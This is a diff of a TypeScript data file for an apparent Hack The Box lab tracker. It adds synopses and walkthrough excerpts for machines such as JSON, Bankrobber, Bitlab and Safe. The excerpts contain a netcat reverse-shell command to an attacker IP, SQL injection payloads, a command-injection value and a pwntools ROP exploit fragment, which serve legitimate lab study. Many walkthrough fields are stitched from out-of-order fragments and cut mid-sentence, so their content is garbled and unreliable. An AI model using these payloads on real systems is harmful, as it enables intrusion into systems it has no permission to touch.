+    "officialSynopsis": "JSON is a medium difficulty Windows machine running an IIS server with an ASP.NET application. The application is found to be vulnerable to .NET deserialization, which is exploited using ysoserial.net. A custom .NET program is found to be installed, which on reverse engineering reveals encrypted credentials for an administrator. These credentials can be decrypted and used to gain access to the FTP folder.",
+    "skillsLearned": [
+      "Using ysoserial.net",
+      "dnSpy"
+    ],
+    "officialPdf": "210-Json_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nJSON is a medium difficulty Windows machine running an IIS server with an ASP.NET application. The application is found to be vulnerable to .NET deserialization, which is exploited using ysoserial.net. A custom .NET program is found to be installed, which on reverse engineering reveals encrypted credentials for an administrator. These credentials can be decrypted and used to gain access to the FTP folder.\n\n### 🎯 Core Skills\n- **Using ysoserial.net**\n- **dnSpy**\n\n### ⚔️ Foothold Vector\nHaving confirmed code execution, we can try getting a reverse shell on the box. We can use a netcat binary to send a reverse shell to ourselves. Start an smbserver locally to host the binary. Next, copy the nc.exe binary to the current folder, and create a JSON.Net payload for the command: The command above uses nc.exe present on our share to send a reverse shell to port 443. Swap the older payload with the newly generated one and forward the request, after which a shell as userpool should be received. \\\\\\\\10.10.14.6\\\\share\\\\nc.exe 10.10.14.6 443 -e cmd.exe\n\n### 👑 Privilege Escalation\nLooking at the installed programs, a program named Sync2Ftp is found to be installed. The folder is found to contain a binary and configuration file. These could be of interest as the application isn't standard, and could be user defined. Copy these files to the SMB share running on our host. Running file on the binary reveals that it's a .NET executable. The config file is found to contain some encrypted fields and configuration values. dnSpy can used to reverse and analyze .NET executables. Open up the binary in dnSpy x86 and analyze the SyncLocation assembly. <?xml version=\"1."
   },
   {
     "id": "htb-bankrobber",
@@ -8456,15 +10004,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "Buffer-Overflow",
+      "Command-Injection",
+      "File-read-through-SQLi",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bankrobber",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bankrobber",
-    "hint": "Hack The Box Windows machine. Rated Insane difficulty.",
+    "hint": "Bankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the admin panel.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-09-21T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the admin panel. The panel is found to contain additional functionality, which can be exploited to read files as well as execute code and gain foothold. An unknown service running on the box is found to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary commands as SYSTEM.",
+    "skillsLearned": [
+      "Command Injection",
+      "File read through SQLi",
+      "Buffer Overflow"
+    ],
+    "officialPdf": "209-Bankrobber_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBankrobber is an Insane difficulty Windows machine featuring a web server that is vulnerable to XSS. This is exploited to steal the administrator's cookies, which are used to gain access to the admin panel. The panel is found to contain additional functionality, which can be exploited to read files as well as execute code and gain foothold. An unknown service running on the box is found to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary commands as SYSTEM.\n\n### 🎯 Core Skills\n- **Command Injection**\n- **File read through SQLi**\n- **Buffer Overflow**\n\n### ⚔️ Foothold Vector\n. An unknown service running on the box is found to be vulnerable to a buffer overflow, which can be exploited to execute arbitrary commands as SYSTEM. Skills Required Enumeration JavaScript XSS Payloads SQL Injection Skills Learned Command Injection File read through SQLi Buffer Overflow Enumeration Nmap Nmap output identifies that this is a Windows box running SMB, HTTP and HTTPS on their default ports. Additionally, a MySQL server is exposed. HTTP Browsing to port 80, a cryptocurrency related website is found. The registration form is used to create a new account and then login. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.\n\n### 👑 Privilege Escalation\nuser with the highest privileges. The current database name is found to be bankrobber . A list of all databases can be obtained by using the INFORMATION_SCHEMA.SCHEMATA table. x' UNION SELECT 1,user(),3-- - x' UNION SELECT 1,schema_name,3 from INFORMATION_SCHEMA.SCHEMATA-- - The only non-default database is found to be bankrobber , i.e. the current database. Let's look at the tables in this database. The database is found to contain the tables balance, hold and users. There's nothing interesting in these, as we already have the administrator's credentials. File Read through SQL injection The MySQL LOAD_FILE() function can be used to read files on the server."
   },
   {
     "id": "htb-wall",
@@ -8475,15 +10034,28 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "CVE-2019-16405",
+      "CVE-2019-17501",
+      "Decompiling-python-code",
+      "HTB",
+      "HTTP-Verb-tampering",
+      "WAF-bypass"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/wall",
     "writeupUrl": "https://0xdf.gitlab.io/tags#wall",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Wall is a medium difficulty Linux machine running a vulnerable version of Centreon network monitoring software, which can be accessed through HTTP Verb Tampering. The login page can be brute-forced to gain Admin access, which is exploited to gain RCE.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-09-14T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Wall is a medium difficulty Linux machine running a vulnerable version of Centreon network monitoring software, which can be accessed through HTTP Verb Tampering. The login page can be brute-forced to gain Admin access, which is exploited to gain RCE. A compiled python file is decompiled to extract user credentials This provides access to an SUID, resulting in a root shell.",
+    "skillsLearned": [
+      "HTTP Verb tampering",
+      "WAF bypass",
+      "Decompiling python code"
+    ],
+    "officialPdf": "208-Wall_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nWall is a medium difficulty Linux machine running a vulnerable version of Centreon network monitoring software, which can be accessed through HTTP Verb Tampering. The login page can be brute-forced to gain Admin access, which is exploited to gain RCE. A compiled python file is decompiled to extract user credentials This provides access to an SUID, resulting in a root shell.\n\n### 🎯 Core Skills\n- **HTTP Verb tampering**\n- **WAF bypass**\n- **Decompiling python code**\n\n### 🛡️ Associated CVEs\n`CVE-2019-16405`, `CVE-2019-17501`\n\n### ⚔️ Foothold Vector\nCVE 2019-13024 The technical details about the vulnerability can be found here. An attacker can inject OS level commands due to a lack of sanitization in the \"nagios_bin\" input parameter while configuring pollers. Click on the settings on the left side and go to Pollers > Pollers. An existing poller named \"Central\" should be seen. Click on the name to view the configuration settings, and then change the \"Monitoring Engine Binary\" to \"id;\".\n\n### 👑 Privilege Escalation\nshell. Skills Required ● Enumeration ● Scripting Skills Learned ● HTTP Verb tampering ● WAF bypass ● Decompiling python code"
   },
   {
     "id": "htb-bitlab",
@@ -8494,15 +10066,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Dynamic-Binary-Analysis",
+      "Git-Hooks",
+      "HTB",
+      "Web-Hooks"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/bitlab",
     "writeupUrl": "https://0xdf.gitlab.io/tags#bitlab",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Bitlab is a medium difficulty Linux machine running a Gitlab server. The website is found to contain a bookmark, which can autofill credentials for the Gitlab login.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-09-07T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Bitlab is a medium difficulty Linux machine running a Gitlab server. The website is found to contain a bookmark, which can autofill credentials for the Gitlab login. After logging in, the user's developer access can be used to write to a repository and deploy a backdoor with the help of git hooks. The PostgreSQL server running locally is found to contain the user's password, which is used to gain SSH access. The user's home folder contains Windows binary, which is analyzed to obtain the root password.",
+    "skillsLearned": [
+      "Web Hooks",
+      "Git Hooks",
+      "Dynamic Binary Analysis"
+    ],
+    "officialPdf": "207-Bitlab_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nBitlab is a medium difficulty Linux machine running a Gitlab server. The website is found to contain a bookmark, which can autofill credentials for the Gitlab login. After logging in, the user's developer access can be used to write to a repository and deploy a backdoor with the help of git hooks. The PostgreSQL server running locally is found to contain the user's password, which is used to gain SSH access. The user's home folder contains Windows binary, which is analyzed to obtain the root password.\n\n### 🎯 Core Skills\n- **Web Hooks**\n- **Git Hooks**\n- **Dynamic Binary Analysis**\n\n### ⚔️ Foothold Vector\nHaving confirmed our code injection, we can now add a backdoor PHP shell to the /profile folder. Download the PHP the shell from here and edit the IP address and port to reflect yours, then click on + followed by Upload file . Upload the reverse shell and then click on upload. Next, follow the same process as earlier to merge changes. After the merge completes, the shell can be executed by browsing to http://10.10.10.114/profile/shell.php . Lateral Movement A TTY shell can be spawned using python. Looking at the ports open locally, we find port 5432 to be open. This is the default port for PostgreSQL server, which can be confirmed by looking at the running processes.\n\n### 👑 Privilege Escalation\npassword. Skills Required Enumeration Reversing Git Skills Learned Web Hooks Git Hooks Dynamic Binary Analysis Enumeration Nmap SSH and Nginx are found to be running on their common ports. Nmap returned some entries from the robots.txt file, let's look at these. Nginx Browsing to the web root, a login page for the Gitlab is returned. The robots.txt file contains disallowed entries as per the Gitlab configuration. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.114 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.114 Gobuster Let's use gobuster to discover any other hidden directories."
   },
   {
     "id": "htb-zetta",
@@ -8513,15 +10096,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "FXP-&-FTP-Bounce-Attack",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/zetta",
     "writeupUrl": "https://0xdf.gitlab.io/tags#zetta",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Zetta is a hard difficulty Linux machine running an FTP server with FXP enabled, which allows us to leak the server's IPv6 address and scan it. An rsync server is found to be running on the IPv6 interface, that can be brute-forced to gain access to a user's home folder.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-08-31T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Zetta is a hard difficulty Linux machine running an FTP server with FXP enabled, which allows us to leak the server's IPv6 address and scan it. An rsync server is found to be running on the IPv6 interface, that can be brute-forced to gain access to a user's home folder.",
+    "skillsLearned": [
+      "Postgres Command Execution",
+      "FXP & FTP Bounce Attack"
+    ],
+    "officialPdf": "204-Zetta_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nZetta is a hard difficulty Linux machine running an FTP server with FXP enabled, which allows us to leak the server's IPv6 address and scan it. An rsync server is found to be running on the IPv6 interface, that can be brute-forced to gain access to a user's home folder.\n\n### 🎯 Core Skills\n- **Postgres Command Execution**\n- **FXP & FTP Bounce Attack**\n\n### ⚔️ Foothold Vector\nThe user's home folder can now be accessed with the discovered password. We can transfer our public key to the .ssh/authorized_keys folder in the users' home folder and login via SSH. Lateral Movement A file named .tudu.xml is found in the home folder. This file can be transferred using scp and viewed using a browser. Among the pending tasks, we see the following entries: The password scheme for users is set to <secret>@username , let's note this down for later. The file also mentions something about syslog-db access and PostgreSQL. During enumeration of the rsync server earlier, we found that access to .git folders was denied.\n\n### 👑 Privilege Escalation\nshell. Skills Required Enumeration Bash Scripting SQL Injection Skills Learned Postgres Command Execution FXP & FTP Bounce Attack Enumeration Nmap A Pure-FTPd server is running on port 21, SSH and Nginx are found to be running on their common ports. Apache Browsing to port 80, we come across a website providing file sharing services. Scrolling down to he \"Sharing\" section, credentials for FTP server can be found. FTP Let's try logging in to FTP with these credentials. ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.156 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.156 There are no files present in the folder."
   },
   {
     "id": "htb-networked",
@@ -8532,15 +10123,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "Command-injection",
+      "File-upload-bypass",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/networked",
     "writeupUrl": "https://0xdf.gitlab.io/tags#networked",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-08-24T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Networked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.",
+    "skillsLearned": [
+      "File upload bypass",
+      "Command injection"
+    ],
+    "officialPdf": "203-Networked_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nNetworked is an Easy difficulty Linux box vulnerable to file upload bypass, leading to code execution. Due to improper sanitization, a crontab running as the user can be exploited to achieve command execution. The user has privileges to execute a network configuration script, which can be leveraged to execute commands as root.\n\n### 🎯 Core Skills\n- **File upload bypass**\n- **Command injection**\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration ● Source code review Skills Learned ● File upload bypass ● Command injection"
   },
   {
     "id": "htb-scavenger",
@@ -8551,15 +10151,24 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Reversing-Rootkits",
+      "SQL-Injection"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/scavenger",
     "writeupUrl": "https://0xdf.gitlab.io/tags#scavenger",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Scavenger is a hard difficulty Linux machine running various services such as DNS, SMTP, Whois etc. The whois service is found to be vulnerable to SQL injection, exploitation of which reveals vhosts.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-08-17T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Scavenger is a hard difficulty Linux machine running various services such as DNS, SMTP, Whois etc. The whois service is found to be vulnerable to SQL injection, exploitation of which reveals vhosts. The vhosts are enumerated to find a hidden PHP backdoor, which is used to execute code on the server. A forward shell is used to gain access to FTP credentials, resulting in access to a compromised user account. The user's home profile contains a hidden rootkit, which is decompiled. The information gained from this is used to elevate to a root shell.",
+    "skillsLearned": [
+      "SQL Injection",
+      "Reversing Rootkits"
+    ],
+    "officialPdf": "202-Scavenger_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nScavenger is a hard difficulty Linux machine running various services such as DNS, SMTP, Whois etc. The whois service is found to be vulnerable to SQL injection, exploitation of which reveals vhosts. The vhosts are enumerated to find a hidden PHP backdoor, which is used to execute code on the server. A forward shell is used to gain access to FTP credentials, resulting in access to a compromised user account. The user's home profile contains a hidden rootkit, which is decompiled. The information gained from this is used to elevate to a root shell.\n\n### 🎯 Core Skills\n- **SQL Injection**\n- **Reversing Rootkits**\n\n### ⚔️ Foothold Vector\nof which reveals vhosts. The vhosts are enumerated to find a hidden PHP backdoor, which is used to execute code on the server. A forward shell is used to gain access to FTP credentials, resulting in access to a compromised user account. The user's home profile contains a hidden\n\n### 👑 Privilege Escalation\nkit, which is decompiled. The information gained from this is used to elevate to a root shell. Skills Required Enumeration Fuzzing Reversing Reviewing C code Skills Learned SQL Injection Reversing Rootkits Enumeration Nmap The server is found to be running FTP, SSH, SMTP, DNS and Apache on their common ports. Additionally, a whois server is found to be running on port 43. Apache Browsing to port 80, we find the error message below. The server denies direct IP access and expects a vhost in the host header. Whois Let's query the whois service and look for information. Connecting to the service using nc returns the following: ports=$(nmap -p- --min-rate=1000 -T4 10.10.10."
   },
   {
     "id": "htb-heist",
@@ -8570,15 +10179,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "Cracking-Cisco-hashes",
+      "HTB",
+      "ProcDump",
+      "RID-bruteforce"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/heist",
     "writeupUrl": "https://0xdf.gitlab.io/tags#heist",
-    "hint": "Hack The Box Windows machine. Rated Easy difficulty.",
+    "hint": "Heist is an easy difficulty Windows box with an \"Issues\" portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-08-10T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Heist is an easy difficulty Windows box with an \"Issues\" portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator's password.",
+    "skillsLearned": [
+      "RID bruteforce",
+      "Cracking Cisco hashes",
+      "ProcDump"
+    ],
+    "officialPdf": "201-Heist_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nHeist is an easy difficulty Windows box with an \"Issues\" portal accessible on the web server, from which it is possible to gain Cisco password hashes. These hashes are cracked, and subsequently RID bruteforce and password spraying are used to gain a foothold on the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator's password.\n\n### 🎯 Core Skills\n- **RID bruteforce**\n- **Cracking Cisco hashes**\n- **ProcDump**\n\n### ⚔️ Foothold Vector\non the box. The user is found to be running Firefox. The firefox.exe process can be dumped and searched for the administrator's password. Skills Required ● Enumeration Skills Learned ● RID bruteforce ● Cracking Cisco hashes ● ProcDump\n\n### 👑 Privilege Escalation\nA ToDo list is found on the user's desktop. According to this Chase will be checking the issues list frequently. Looking at the running processes, we see that Firefox is active. Maybe he's using firefox to login to the Issues portal? As we have control over the process, we can dump the process and find passwords in it."
   },
   {
     "id": "htb-rope",
@@ -8589,15 +10209,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Insane",
     "status": "backlog",
     "tags": [
+      "Format-String",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/rope",
     "writeupUrl": "https://0xdf.gitlab.io/tags#rope",
-    "hint": "Hack The Box Linux machine. Rated Insane difficulty.",
+    "hint": "Rope is an insane difficulty Linux machine covering different aspects of binary exploitation. The web server can be exploited to gain access to the file system and download the binary.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-08-03T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Rope is an insane difficulty Linux machine covering different aspects of binary exploitation. The web server can be exploited to gain access to the file system and download the binary. The binary is found to be vulnerable to format string exploitation, which is leveraged to get remote code execution. After gaining foothold, the user is found to have access to a shared library, which can be modified to execute code as another user. A service running on localhost can be exploited via a ROP (Return Oriented Programming) attack to gain a root shell.",
+    "skillsLearned": [
+      "Format String"
+    ],
+    "officialPdf": "200-Rope_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRope is an insane difficulty Linux machine covering different aspects of binary exploitation. The web server can be exploited to gain access to the file system and download the binary. The binary is found to be vulnerable to format string exploitation, which is leveraged to get remote code execution. After gaining foothold, the user is found to have access to a shared library, which can be modified to execute code as another user. A service running on localhost can be exploited via a ROP (Return Oriented Programming) attack to gain a root shell.\n\n### 🎯 Core Skills\n- **Format String**\n\n### ⚔️ Foothold Vector\n. The web server can be exploited to gain access to the file system and download the binary. The binary is found to be vulnerable to format string exploitation, which is leveraged to get remote code execution. After gaining foothold, the user is found to have access to a shared library, which can be modified to execute code as another user. A service running on localhost can be exploited via a ROP (Return Oriented Programming) attack to gain a\n\n### 👑 Privilege Escalation\nshell. Skills Required Enumeration Pwntools Scripting Basic C and Reversing Skills Learned Format String Exploitation Canary & PIE (Position Independent Executable) Bypass ROP Chains Enumeration Nmap SSH is found to be running on it's default port, along with an unknown HTTP server running on port 9999. HTTP Browsing to port 9999 in the browser, we come across a login page. Nikto ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.148 | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//) nmap -p$ports -sC -sV 10.10.10.148 Let's run nikto on the web server to perform automated checks. According to Nikto, we should be able to read files by prefixing / to the filename. Let's try this out."
   },
   {
     "id": "htb-safe",
@@ -8613,10 +10240,16 @@ export const INITIAL_MACHINES: Machine[] = [
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/safe",
     "writeupUrl": "https://0xdf.gitlab.io/tags#safe",
-    "hint": "Hack The Box Linux machine. Rated Easy difficulty.",
+    "hint": "Safe is an Easy difficulty Linux VM with a vulnerable service running on a port. The binary is found to be vulnerable to buffer overflow, which needs to be exploited through Return Oriented Programming (ROP) to get a shell.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-07-27T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Safe is an Easy difficulty Linux VM with a vulnerable service running on a port. The binary is found to be vulnerable to buffer overflow, which needs to be exploited through Return Oriented Programming (ROP) to get a shell. The user's folder contain images and a keepass database which can be cracked using John the ripper to gain the root password.",
+    "skillsLearned": [
+      "Cracking keepass databases"
+    ],
+    "officialPdf": "199-Safe_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nSafe is an Easy difficulty Linux VM with a vulnerable service running on a port. The binary is found to be vulnerable to buffer overflow, which needs to be exploited through Return Oriented Programming (ROP) to get a shell. The user's folder contain images and a keepass database which can be cracked using John the ripper to gain the root password.\n\n### 🎯 Core Skills\n- **Cracking keepass databases**\n\n### ⚔️ Foothold Vector\nLet's run the exploit locally to see if it worked. The chain was successful and we were able to pop a shell. Let's modify the script to send this payload to the server. from pwn import * p = remote(\"10.10.10.147\" , 1337) buf = \"A\" * 120 ''' 0x0000000000401206: pop r13; pop r14; pop r15; ret; ''' pop_r13_junk_junk = p64(0x401206) ''' 0x000000000040116e <+15>: call 0x401040 <system@plt> ''' system = p64(0x40116e) binsh = \"/bin/sh\\x00\" ''' 0x0000000000401156 <+4>: mov rdi,rsp 0x0000000000401159 <+7>: jmp r13 ''' test = p64(0x401156)\n\n### 👑 Privilege Escalation\npassword. Skills Required ● Enumeration ● Exploit Development Skills Learned ● ROP ● Cracking keepass databases"
   },
   {
     "id": "htb-re",
@@ -8627,15 +10260,25 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
+      "Evading-Yara",
+      "Ghidra-XXE",
       "HTB"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/re",
     "writeupUrl": "https://0xdf.gitlab.io/tags#re",
-    "hint": "Hack The Box Windows machine. Rated Hard difficulty.",
+    "hint": "RE is a hard difficulty Windows machine, featuring analysis of ODS documents using Yara. A maliciously crafted document can be used to evade detection and gain a foothold.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-07-20T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "RE is a hard difficulty Windows machine, featuring analysis of ODS documents using Yara. A maliciously crafted document can be used to evade detection and gain a foothold. The box uses an old version of WinRAR, which is vulnerable to path traversal. This is exploited to drop a shell to the web root and land a shell as the IIS user who has write access to the project folder. A Ghidra project is then uploaded to the folder to exploit XXE and steal admin hashes.",
+    "skillsLearned": [
+      "Evading Yara",
+      "Exploiting WinRAR path traversal",
+      "Ghidra XXE"
+    ],
+    "officialPdf": "198-RE_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nRE is a hard difficulty Windows machine, featuring analysis of ODS documents using Yara. A maliciously crafted document can be used to evade detection and gain a foothold. The box uses an old version of WinRAR, which is vulnerable to path traversal. This is exploited to drop a shell to the web root and land a shell as the IIS user who has write access to the project folder. A Ghidra project is then uploaded to the folder to exploit XXE and steal admin hashes.\n\n### 🎯 Core Skills\n- **Evading Yara**\n- **Exploiting WinRAR path traversal**\n- **Ghidra XXE**\n\n### ⚔️ Foothold Vector\n. The box uses an old version of WinRAR, which is vulnerable to path traversal. This is exploited to drop a shell to the web\n\n### 👑 Privilege Escalation\nand land a shell as the IIS user who has write access to the project folder. A Ghidra project is then uploaded to the folder to exploit XXE and steal admin hashes. Skills Required ● Enumeration ● VBA macros Skills Learned ● Evading Yara ● Exploiting WinRAR path traversal ● Ghidra XXE"
   },
   {
     "id": "htb-craft",
@@ -8646,15 +10289,26 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Medium",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Python-eval-injection",
+      "Vault-SSH",
+      "pymysql-API"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/craft",
     "writeupUrl": "https://0xdf.gitlab.io/tags#craft",
-    "hint": "Hack The Box Linux machine. Rated Medium difficulty.",
+    "hint": "Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-07-13T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Craft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.",
+    "skillsLearned": [
+      "Python eval injection",
+      "pymysql API",
+      "Vault SSH"
+    ],
+    "officialPdf": "197-Craft_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nCraft is a medium difficulty Linux box, hosting a Gogs server with a public repository. One of the issues in the repository talks about a broken feature, which calls the eval function on user input. This is exploited to gain a shell on a container, which can query the database containing a user credential. After logging in, the user is found to be using vault to manage the SSH server, and the secret for which is in their Gogs account. This secret is used to create an OTP which can be used to SSH in as root.\n\n### 🎯 Core Skills\n- **Python eval injection**\n- **pymysql API**\n- **Vault SSH**\n\n### ⚔️ Foothold Vector\non the box. Looking at the commits in the repo, we find another commit by Dinesh, which added a test script.\n\n### 👑 Privilege Escalation\n. Skills Required ● Linux Enumeration ● Python code review ● Git Skills Learned ● Python eval injection ● pymysql API ● Vault SSH"
   },
   {
     "id": "htb-player",
@@ -8665,15 +10319,22 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Hard",
     "status": "backlog",
     "tags": [
-      "HTB"
+      "HTB",
+      "Vhost"
     ],
     "certifications": [],
     "roomUrl": "https://app.hackthebox.com/machines/player",
     "writeupUrl": "https://0xdf.gitlab.io/tags#player",
-    "hint": "Hack The Box Linux machine. Rated Hard difficulty.",
+    "hint": "Player is a Hard difficulty Linux box featuring multiple vhosts and a vulnerable SSH server. Sensitive information gained from a chat can be leveraged to find source code.",
     "timeSpentSeconds": 0,
     "createdAt": "2019-07-06T16:00:00.000000Z",
-    "updatedAt": "2026-08-20T11:30:00.000Z"
+    "updatedAt": "2026-08-20T11:30:00.000Z",
+    "officialSynopsis": "Player is a Hard difficulty Linux box featuring multiple vhosts and a vulnerable SSH server. Sensitive information gained from a chat can be leveraged to find source code. This is used to gain access to an internal application vulnerable to LFI through FFMPEG, leading to credential disclosure. The vulnerable SSH server is exploited to login to a Codiad instance, which can be used to gain a foothold. Process",
+    "skillsLearned": [
+      "Vhost"
+    ],
+    "officialPdf": "196-Player_HTB_Official_writeup_Tamarisk.pdf",
+    "officialWalkthrough": "### 📋 Official Synopsis\nPlayer is a Hard difficulty Linux box featuring multiple vhosts and a vulnerable SSH server. Sensitive information gained from a chat can be leveraged to find source code. This is used to gain access to an internal application vulnerable to LFI through FFMPEG, leading to credential disclosure. The vulnerable SSH server is exploited to login to a Codiad instance, which can be used to gain a foothold. Process\n\n### 🎯 Core Skills\n- **Vhost**\n\n### ⚔️ Foothold Vector\n. Process enumeration reveals a cron job which executes a script that is vulnerable to PHP deserialization. The script is exploited to write files and gain a shell as\n\n### 👑 Privilege Escalation\n. Skills Required ● Enumeration ● PHP serialization Skills Learned ● Vhost enumeration ● Creating JWT Cookies ● LFI through FFMPEG"
   },
   {
     "id": "htb-haystack",
@@ -8684,15 +10345,23 @@ export const INITIAL_MACHINES: Machine[] = [
     "difficulty": "Easy",
     "status": "backlog",
     "tags": [
+      "CVE-2018-17246",
+      "Elasticsearch",
       "HTB"
     ],
     "certifications": [],
